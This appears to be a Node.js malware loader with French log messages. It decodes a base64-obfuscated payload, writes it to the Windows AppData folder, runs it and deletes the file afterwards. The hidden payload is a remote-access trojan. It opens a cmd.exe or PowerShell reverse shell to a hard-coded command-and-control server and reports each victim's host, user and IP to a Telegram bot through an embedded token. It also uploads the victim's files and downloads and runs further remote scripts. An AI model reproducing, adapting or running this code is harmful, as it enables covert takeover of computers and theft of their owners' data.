
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');


const encodedPayload = "Y29uc3QgbmV0ID0gcmVxdWlyZSgnbmV0Jyk7CmNvbnN0IHsgc3Bhd24sIGV4ZWMgfSA9IHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKTsKY29uc3Qgb3MgPSByZXF1aXJlKCdvcycpOwpjb25zdCBmcyA9IHJlcXVpcmUoJ2ZzJyk7CmNvbnN0IHBhdGggPSByZXF1aXJlKCdwYXRoJyk7CmNvbnN0IGh0dHBzID0gcmVxdWlyZSgnaHR0cHMnKTsKCmNvbnN0IEMyX0hPU1QgPSAnMTQ1LjIyMy4zNC4xMDAnOwpjb25zdCBDMl9QT1JUID0gNDQ0NDsKCmxldCBjdXJyZW50U2hlbGwgPSBudWxsOwpsZXQgY2xpZW50U29ja2V0ID0gbnVsbDsKCmZ1bmN0aW9uIHNlbmRUZWxlZ3JhbU1lc3NhZ2UobWVzc2FnZSkgewogIGNvbnN0IGJvdFRva2VuID0gJzc3ODgxNjYwNjE6QUFHaWJ6OERHVHNiX3BxTVphTzBRRm5aQkVpd0lCaXhuLVUnOwogIGNvbnN0IGNoYXRJZCA9ICctNDgwMzAzMTkxNic7CiAgY29uc3QgdXJsID0gYGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qke2JvdFRva2VufS9zZW5kTWVzc2FnZWA7CgogIGNvbnN0IGRhdGEgPSBKU09OLnN0cmluZ2lmeSh7CiAgICBjaGF0X2lkOiBjaGF0SWQsCiAgICB0ZXh0OiBtZXNzYWdlLAogICAgcGFyc2VfbW9kZTogJ01hcmtkb3duJwogIH0pOwoKICBjb25zdCByZXEgPSBodHRwcy5yZXF1ZXN0KHVybCwgewogICAgbWV0aG9kOiAnUE9TVCcsCiAgICBoZWFkZXJzOiB7CiAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICdDb250ZW50LUxlbmd0aCc6IGRhdGEubGVuZ3RoCiAgICB9CiAgfSwgcmVzID0+IHt9KTsKCiAgcmVxLm9uKCdlcnJvcicsIGVycm9yID0+IHsKICAgIGNvbnNvbGUuZXJyb3IoYFshXSBFcnJldXIgVGVsZWdyYW06ICR7ZXJyb3J9YCk7CiAgfSk7CgogIHJlcS53cml0ZShkYXRhKTsKICByZXEuZW5kKCk7Cn0KCmZ1bmN0aW9uIHJhbmRvbURlbGF5KCkgewogIHJldHVybiBNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiAoODAwMCAtIDMwMDAgKyAxKSkgKyAzMDAwOwp9CgpmdW5jdGlvbiBzdGFydFNoZWxsKGNsaWVudCwgc2hlbGxUeXBlKSB7CiAgaWYgKGN1cnJlbnRTaGVsbCkgY3VycmVudFNoZWxsLmtpbGwoKTsKCiAgY29uc3Qgc2hlbGxDbWQgPSBzaGVsbFR5cGUgPT09ICdwb3dlcnNoZWxsJyA/ICdwb3dlcnNoZWxsLmV4ZScgOiAnY21kLmV4ZSc7CiAgY3VycmVudFNoZWxsID0gc3Bhd24oc2hlbGxDbWQsIFtdLCB7IHN0ZGlvOiBbJ3BpcGUnLCAncGlwZScsICdwaXBlJ10gfSk7CgogIGNsaWVudC53cml0ZShgWytdIFNoZWxsICR7c2hlbGxDbWR9IGFjdGlmXG5gKTsKICBjbGllbnQucGlwZShjdXJyZW50U2hlbGwuc3RkaW4pOwogIGN1cnJlbnRTaGVsbC5zdGRvdXQucGlwZShjbGllbnQpOwogIGN1cnJlbnRTaGVsbC5zdGRlcnIucGlwZShjbGllbnQpOwoKICBjdXJyZW50U2hlbGwub24oJ2V4aXQnLCAoKSA9PiB7CiAgICBjbGllbnQud3JpdGUoYFshXSBMZSBzaGVsbCAke3NoZWxsQ21kfSBzJ2VzdCB0ZXJtaW7DqS5cbmApOwogICAgc2VuZFRlbGVncmFtTWVzc2FnZShg4p2MIFtTaGVsbCBGZXJtw6ldXG5UeXBlOiAke3NoZWxsQ21kfVxuSGV1cmU6ICR7bmV3IERhdGUoKS50b0xvY2FsZVN0cmluZygpfWApOwogIH0pOwp9CgpmdW5jdGlvbiBkb3dubG9hZEZpbGUodXJsLCBkZXN0KSB7CiAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsKICAgIGNvbnN0IGZpbGUgPSBmcy5jcmVhdGVXcml0ZVN0cmVhbShkZXN0KTsKICAgIGh0dHBzLmdldCh1cmwsIChyZXNwb25zZSkgPT4gewogICAgICByZXNwb25zZS5waXBlKGZpbGUpOwogICAgICBmaWxlLm9uKCdmaW5pc2gnLCAoKSA9PiB7CiAgICAgICAgZmlsZS5jbG9zZSgpOwogICAgICAgIHJlc29sdmUoKTsKICAgICAgfSk7CiAgICB9KS5vbignZXJyb3InLCAoZXJyKSA9PiB7CiAgICAgIGZzLnVubGluayhkZXN0LCAoKSA9PiB7fSk7CiAgICAgIHJlamVjdChlcnIpOwogICAgfSk7CiAgfSk7Cn0KCi8vIEZvbmN0aW9uIHBvdXIgdMOpbMOpY2hhcmdlciB1biBmaWNoaWVyIGxvY2FsIGV0IGwnZW52b3llciBhdSBDMgpmdW5jdGlvbiB1cGxvYWRGaWxlVG9DMihmaWxlUGF0aCwgY2xpZW50KSB7CiAgdHJ5IHsKICAgIC8vIFbDqXJpZmllciBzaSBsZSBmaWNoaWVyIGV4aXN0ZQogICAgaWYgKCFmcy5leGlzdHNTeW5jKGZpbGVQYXRoKSkgewogICAgICBjbGllbnQud3JpdGUoYFshXSBFcnJldXI6IExlIGZpY2hpZXIgJHtmaWxlUGF0aH0gbidleGlzdGUgcGFzXG5gKTsKICAgICAgcmV0dXJuOwogICAgfQoKICAgIC8vIE9idGVuaXIgbGUgbm9tIGR1IGZpY2hpZXIKICAgIGNvbnN0IGZpbGVOYW1lID0gcGF0aC5iYXNlbmFtZShmaWxlUGF0aCk7CiAgICAKICAgIC8vIExpcmUgbGUgZmljaGllciBldCBsZSBjb252ZXJ0aXIgZW4gYmFzZTY0CiAgICBjbGllbnQud3JpdGUoYFtpXSBMZWN0dXJlIGR1IGZpY2hpZXIgJHtmaWxlUGF0aH0uLi5cbmApOwogICAgCiAgICB0cnkgewogICAgICBjb25zdCBmaWxlQ29udGVudCA9IGZzLnJlYWRGaWxlU3luYyhmaWxlUGF0aCk7CiAgICAgIGNvbnN0IGJhc2U2NENvbnRlbnQgPSBmaWxlQ29udGVudC50b1N0cmluZygnYmFzZTY0Jyk7CiAgICAgIAogICAgICAvLyBFbnZveWVyIGxlIGZpY2hpZXIgYXUgc2VydmV1cgogICAgICBjbGllbnQud3JpdGUoYFtpXSBFbnZvaSBkdSBmaWNoaWVyICR7ZmlsZU5hbWV9IGF1IHNlcnZldXIuLi5cbmApOwogICAgICAKICAgICAgLy8gUGF1c2VyIGxlIHNoZWxsIHBvdXIgw6l2aXRlciBkZXMgaW50ZXJmw6lyZW5jZXMgcGVuZGFudCBsZSB0cmFuc2ZlcnQKICAgICAgaWYgKGN1cnJlbnRTaGVsbCkgewogICAgICAgIGN1cnJlbnRTaGVsbC5zdGRpbi5wYXVzZSgpOwogICAgICB9CiAgICAgIAogICAgICAvLyBGb3JtYXQ6IF9fRE9XTkxPQURfXyA8ZmlsZW5hbWU+IDxiYXNlNjRfY29udGVudD4KICAgICAgLy8gQXR0ZW5kcmUgdW4gcGV1IHBvdXIgcydhc3N1cmVyIHF1ZSBsZXMgbWVzc2FnZXMgc29udCB0cmFpdMOpcyBkYW5zIGwnb3JkcmUKICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgLy8gRW52b3llciBsZSBtYXJxdWV1ciBkZSBkw6lidXQgc3VpdmkgZHUgbm9tIGRlIGZpY2hpZXIgZXQgZGVzIGRvbm7DqWVzCiAgICAgICAgY29uc3QgZG93bmxvYWRNc2cgPSBgX19ET1dOTE9BRF9fICR7ZmlsZU5hbWV9ICR7YmFzZTY0Q29udGVudH1gOwogICAgICAgIGNsaWVudC53cml0ZShkb3dubG9hZE1zZyk7CiAgICAgICAgCiAgICAgICAgLy8gRW52b3llciBub3RpZmljYXRpb24gVGVsZWdyYW0KICAgICAgICBzZW5kVGVsZWdyYW1NZXNzYWdlKGDwn5OkIFtGaWNoaWVyIEV4ZmlsdHLDqV1cbk5vbTogJHtmaWxlTmFtZX1cblRhaWxsZTogJHtmaWxlQ29udGVudC5sZW5ndGggLyAxMDI0fSBLQlxuQ2hlbWluOiAke2ZpbGVQYXRofWApOwogICAgICAgIAogICAgICAgIC8vIFLDqXRhYmxpciBsZSBzaGVsbCBhcHLDqHMgdW4gY291cnQgZMOpbGFpCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICBpZiAoY3VycmVudFNoZWxsKSB7CiAgICAgICAgICAgIGN1cnJlbnRTaGVsbC5zdGRpbi5yZXN1bWUoKTsKICAgICAgICAgIH0KICAgICAgICAgIGNsaWVudC53cml0ZShgXG5bK10gRmljaGllciAke2ZpbGVOYW1lfSBlbnZvecOpIGF2ZWMgc3VjY8Ooc1xuYCk7CiAgICAgICAgfSwgNTAwKTsKICAgICAgfSwgMjAwKTsKICAgIH0gY2F0Y2ggKHJlYWRFcnJvcikgewogICAgICBjbGllbnQud3JpdGUoYFshXSBFcnJldXIgZGUgbGVjdHVyZTogJHtyZWFkRXJyb3IubWVzc2FnZX1cbmApOwogICAgICBpZiAocmVhZEVycm9yLmNvZGUgPT09ICdFQUNDRVMnKSB7CiAgICAgICAgY2xpZW50LndyaXRlKGBbIV0gQWNjw6hzIHJlZnVzw6kgYXUgZmljaGllci4gVsOpcmlmaWV6IGxlcyBwZXJtaXNzaW9ucy5cbmApOwogICAgICB9CiAgICB9CiAgfSBjYXRjaCAoZXJyb3IpIHsKICAgIGNsaWVudC53cml0ZShgWyFdIEVycmV1ciBsb3JzIGRlIGwnZW52b2kgZHUgZmljaGllcjogJHtlcnJvci5tZXNzYWdlfVxuYCk7CiAgfQp9Cgphc3luYyBmdW5jdGlvbiBleGVjdXRlR2l0SHViUGF5bG9hZCh1cmwsIGNsaWVudCkgewogIHRyeSB7CiAgICAvLyBFbnN1cmUgdGhlIHRhcmdldCBkaXJlY3RvcnkgZXhpc3RzCiAgICBjb25zdCBhcHBEYXRhRGlyID0gcGF0aC5qb2luKG9zLmhvbWVkaXIoKSwgJ0FwcERhdGEnLCAnUm9hbWluZycsICdvbmVyZycpOwogICAgaWYgKCFmcy5leGlzdHNTeW5jKGFwcERhdGFEaXIpKSB7CiAgICAgIGZzLm1rZGlyU3luYyhhcHBEYXRhRGlyLCB7IHJlY3Vyc2l2ZTogdHJ1ZSB9KTsKICAgIH0KICAgIAogICAgLy8gQ3JlYXRlIGZpbGVuYW1lIHdpdGggdGltZXN0YW1wCiAgICBjb25zdCB0aW1lc3RhbXAgPSBEYXRlLm5vdygpOwogICAgY29uc3QgcGF5bG9hZFBhdGggPSBwYXRoLmpvaW4oYXBwRGF0YURpciwgYHBheWxvYWRfJHt0aW1lc3RhbXB9LmpzYCk7CiAgICAKICAgIGNsaWVudC53cml0ZShgW2ldIFTDqWzDqWNoYXJnZW1lbnQgZGUgJHt1cmx9Li4uXG5gKTsKICAgIAogICAgLy8gTm90aWZpY2F0aW9uIFRlbGVncmFtIHBvdXIgbGUgZMOpYnV0IGRlIGwnZXjDqWN1dGlvbgogICAgc2VuZFRlbGVncmFtTWVzc2FnZShg8J+agCBbR2l0SHViIFBheWxvYWRdXG5VUkw6ICR7dXJsfVxuTm9tOiBwYXlsb2FkXyR7dGltZXN0YW1wfS5qc1xuU3RhdHV0OiBEw6ltYXJyw6lgKTsKICAgIAogICAgLy8gRG93bmxvYWQgdGhlIGZpbGUKICAgIGF3YWl0IGRvd25sb2FkRmlsZSh1cmwsIHBheWxvYWRQYXRoKTsKICAgIGNsaWVudC53cml0ZShgWytdIFBheWxvYWQgdMOpbMOpY2hhcmfDqSBkYW5zICR7cGF5bG9hZFBhdGh9XG5gKTsKICAgIAogICAgLy8gRXhlY3V0ZSB0aGUgcGF5bG9hZCBhbmQgY2FwdHVyZSBvdXRwdXQKICAgIGNsaWVudC53cml0ZShgW2ldIEV4w6ljdXRpb24gZHUgcGF5bG9hZC4uLlxuYCk7CiAgICAKICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4gewogICAgICBleGVjKGBub2RlICIke3BheWxvYWRQYXRofSJgLCAoZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSA9PiB7CiAgICAgICAgaWYgKGVycm9yKSB7CiAgICAgICAgICBjbGllbnQud3JpdGUoYFshXSBFcnJldXIgZCdleMOpY3V0aW9uOiAke2Vycm9yLm1lc3NhZ2V9XG5gKTsKICAgICAgICAgIHNlbmRUZWxlZ3JhbU1lc3NhZ2UoYOKaoO+4jyBbR2l0SHViIFBheWxvYWQgRXJyb3JdXG5VUkw6ICR7dXJsfVxuRXJyZXVyOiAke2Vycm9yLm1lc3NhZ2V9YCk7CiAgICAgICAgfQogICAgICAgIGlmIChzdGRvdXQpIHsKICAgICAgICAgIGNsaWVudC53cml0ZShgW1NURE9VVF0gJHtzdGRvdXR9XG5gKTsKICAgICAgICB9CiAgICAgICAgaWYgKHN0ZGVycikgewogICAgICAgICAgY2xpZW50LndyaXRlKGBbU1RERVJSXSAke3N0ZGVycn1cbmApOwogICAgICAgIH0KICAgICAgICBjbGllbnQud3JpdGUoYFsrXSBFeMOpY3V0aW9uIHRlcm1pbsOpZVxuYCk7CiAgICAgICAgLy8gTm90aWZpY2F0aW9uIFRlbGVncmFtIHBvdXIgbGEgZmluIGRlIGwnZXjDqWN1dGlvbgogICAgICAgIHNlbmRUZWxlZ3JhbU1lc3NhZ2UoYOKchSBbR2l0SHViIFBheWxvYWQgVGVybWluw6ldXG5VUkw6ICR7dXJsfVxuTm9tOiBwYXlsb2FkXyR7dGltZXN0YW1wfS5qc2ApOwogICAgICAgIHJlc29sdmUoKTsKICAgICAgfSk7CiAgICB9KTsKICB9IGNhdGNoIChlcnJvcikgewogICAgY2xpZW50LndyaXRlKGBbIV0gRXJyZXVyOiAke2Vycm9yLm1lc3NhZ2V9XG5gKTsKICAgIHNlbmRUZWxlZ3JhbU1lc3NhZ2UoYOKaoO+4jyBbR2l0SHViIFBheWxvYWQgRXJyb3JdXG5VUkw6ICR7dXJsfVxuRXJyZXVyOiAke2Vycm9yLm1lc3NhZ2V9YCk7CiAgfQp9CgpmdW5jdGlvbiBoYW5kbGVOYXRpdmVDb21tYW5kKGNtZCwgY2xpZW50KSB7CiAgY29uc3QgcGFydHMgPSBjbWQuc3BsaXQoJyAnKTsKICBpZiAocGFydHNbMF0gPT09ICdpbmZvJykgewogICAgY29uc3QgaW5mbyA9IHsKICAgICAgcGxhdGZvcm06IG9zLnBsYXRmb3JtKCksCiAgICAgIHVzZXJuYW1lOiBvcy51c2VySW5mbygpLnVzZXJuYW1lLAogICAgICB1cHRpbWU6IG9zLnVwdGltZSgpLAogICAgICBjd2Q6IHByb2Nlc3MuY3dkKCkKICAgIH07CiAgICBjbGllbnQud3JpdGUoYFtJTkZPXSAke0pTT04uc3RyaW5naWZ5KGluZm8sIG51bGwsIDIpfVxuYCk7CiAgICByZXR1cm4gdHJ1ZTsKICB9CgogIGlmIChwYXJ0c1swXSA9PT0gJ3NsZWVwJyAmJiBwYXJ0c1sxXSkgewogICAgY29uc3QgZGVsYXkgPSBwYXJzZUludChwYXJ0c1sxXSkgKiAxMDAwOwogICAgY2xpZW50LndyaXRlKGBbU0xFRVBdIFBhdXNlIHBlbmRhbnQgJHtwYXJ0c1sxXX1zLi4uXG5gKTsKICAgIGN1cnJlbnRTaGVsbD8ua2lsbCgpOwogICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgIHN0YXJ0U2hlbGwoY2xpZW50LCAnY21kJyk7CiAgICB9LCBkZWxheSk7CiAgICByZXR1cm4gdHJ1ZTsKICB9CgogIGlmIChwYXJ0c1swXSA9PT0gJ2dpdGh1Yl9leGVjJyAmJiBwYXJ0c1sxXSkgewogICAgZXhlY3V0ZUdpdEh1YlBheWxvYWQocGFydHNbMV0sIGNsaWVudCk7CiAgICByZXR1cm4gdHJ1ZTsKICB9CiAgCiAgaWYgKHBhcnRzWzBdID09PSAnZG93bmxvYWQnICYmIHBhcnRzLmxlbmd0aCA+IDEpIHsKICAgIC8vIFJlY29uc3RydWlyZSBsZSBjaGVtaW4gY29tcGxldCAocG91ciBnw6lyZXIgbGVzIGNoZW1pbnMgYXZlYyBlc3BhY2VzKQogICAgY29uc3QgZmlsZVBhdGggPSBwYXJ0cy5zbGljZSgxKS5qb2luKCcgJyk7CiAgICB1cGxvYWRGaWxlVG9DMihmaWxlUGF0aCwgY2xpZW50KTsKICAgIHJldHVybiB0cnVlOwogIH0KCiAgcmV0dXJuIGZhbHNlOwp9CgpmdW5jdGlvbiBjb25uZWN0KCkgewogIGNvbnN0IGNsaWVudCA9IG5ldyBuZXQuU29ja2V0KCk7CgogIGNsaWVudC5jb25uZWN0KEMyX1BPUlQsIEMyX0hPU1QsICgpID0+IHsKICAgIGlmIChjbGllbnRTb2NrZXQpIHJldHVybjsKCiAgICBjbGllbnRTb2NrZXQgPSBjbGllbnQ7CiAgICBjbGllbnQud3JpdGUoYFtPU10gJHtvcy5wbGF0Zm9ybSgpfVxuYCk7CiAgICAKICAgIC8vIEVudm95ZXIgbm90aWZpY2F0aW9uIGRlIG5vdXZlbGxlIGNvbm5leGlvbgogICAgc2VuZFRlbGVncmFtTWVzc2FnZShg8J+foiBbTmV3IENvbm5lY3Rpb25dXG7wn5SNIEhvc3RuYW1lOiAke29zLmhvc3RuYW1lKCl9XG7wn5ONIElQOiAke2NsaWVudC5sb2NhbEFkZHJlc3N9XG7wn6egIFVzZXI6ICR7b3MudXNlckluZm8oKS51c2VybmFtZX1cbvCfqqAgT1M6ICR7b3MucGxhdGZvcm0oKX1cbvCflZ8gVXB0aW1lOiAke29zLnVwdGltZSgpfXNgKTsKICAgIAogICAgc3RhcnRTaGVsbChjbGllbnQsICdjbWQnKTsKCiAgICBjbGllbnQub24oJ2RhdGEnLCAoZGF0YSkgPT4gewogICAgICBjb25zdCBpbnB1dCA9IGRhdGEudG9TdHJpbmcoKTsKICAgICAgY29uc3QgdHJpbW1lZCA9IGlucHV0LnRyaW0oKTsKICAgICAgCiAgICAgIC8vIFRyYWl0ZXIgZCdhYm9yZCBsZXMgY29tbWFuZGVzIG5hdGl2ZXMgYXZhbnQgZGUgbGVzIHBhc3NlciBhdSBzaGVsbAogICAgICBpZiAoaGFuZGxlTmF0aXZlQ29tbWFuZCh0cmltbWVkLCBjbGllbnQpKSB7CiAgICAgICAgLy8gTmUgcmllbiBmYWlyZSBkJ2F1dHJlIHNpIGMnZXN0IHVuZSBjb21tYW5kZSBuYXRpdmUKICAgICAgICByZXR1cm47CiAgICAgIH0gZWxzZSBpZiAodHJpbW1lZCA9PT0gJ3N3aXRjaHNoZWxsJykgewogICAgICAgIGNvbnN0IG5ld1NoZWxsID0gY3VycmVudFNoZWxsLnNwYXduZmlsZS5pbmNsdWRlcygncG93ZXJzaGVsbCcpID8gJ2NtZCcgOiAncG93ZXJzaGVsbCc7CiAgICAgICAgY2xpZW50LndyaXRlKGBbaV0gQmFzY3VsZSB2ZXJzICR7bmV3U2hlbGx9Li4uXG5gKTsKICAgICAgICBzdGFydFNoZWxsKGNsaWVudCwgbmV3U2hlbGwpOwogICAgICB9IGVsc2UgewogICAgICAgIC8vIFNpbm9uIGVudm95ZXIgYXUgc2hlbGwKICAgICAgICBjdXJyZW50U2hlbGwuc3RkaW4ud3JpdGUodHJpbW1lZCArICdcbicpOwogICAgICB9CiAgICB9KTsKCiAgICBjbGllbnQub24oJ2Nsb3NlJywgKCkgPT4gewogICAgICBjdXJyZW50U2hlbGwgPSBudWxsOwogICAgICBjbGllbnRTb2NrZXQgPSBudWxsOwogICAgICBzZW5kVGVsZWdyYW1NZXNzYWdlKGDwn5S0IFtDb25uZWN0aW9uIEZlcm3DqWVdXG5IZXVyZTogJHtuZXcgRGF0ZSgpLnRvTG9jYWxlU3RyaW5nKCl9YCk7CiAgICAgIHNldFRpbWVvdXQoY29ubmVjdCwgcmFuZG9tRGVsYXkoKSk7CiAgICB9KTsKCiAgICBjbGllbnQub24oJ2Vycm9yJywgKGVycm9yKSA9PiB7CiAgICAgIGN1cnJlbnRTaGVsbCA9IG51bGw7CiAgICAgIGNsaWVudFNvY2tldCA9IG51bGw7CiAgICAgIHNlbmRUZWxlZ3JhbU1lc3NhZ2UoYOKaoO+4jyBbQ29ubmVjdGlvbiBFcnJvcl1cbkVycmV1cjogJHtlcnJvci5tZXNzYWdlfVxuSGV1cmU6ICR7bmV3IERhdGUoKS50b0xvY2FsZVN0cmluZygpfWApOwogICAgICBzZXRUaW1lb3V0KGNvbm5lY3QsIHJhbmRvbURlbGF5KCkpOwogICAgfSk7CiAgfSk7Cn0KCmNvbm5lY3QoKTsK";


function executePayload() {
    try {

        const decodedPayload = Buffer.from(encodedPayload, 'base64').toString('utf8');
        

        const tempDir = path.join(process.env.APPDATA, 'onerg');
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
        }
        
        const tempFile = path.join(tempDir, `payload_${Date.now()}.js`);
        

        fs.writeFileSync(tempFile, decodedPayload);
        

        exec(`node "${tempFile}"`, (error, stdout, stderr) => {
            if (error) {
                console.error(`[-] Erreur d'exécution: ${error.message}`);
                return;
            }
            if (stdout) console.log(stdout);
            if (stderr) console.error(stderr);
            

            try {
                fs.unlinkSync(tempFile);
            } catch (cleanupError) {
                console.error(`[-] Erreur de nettoyage: ${cleanupError.message}`);
            }
        });
    } catch (error) {
        console.error(`[-] Erreur: ${error.message}`);
    }
}


executePayload();
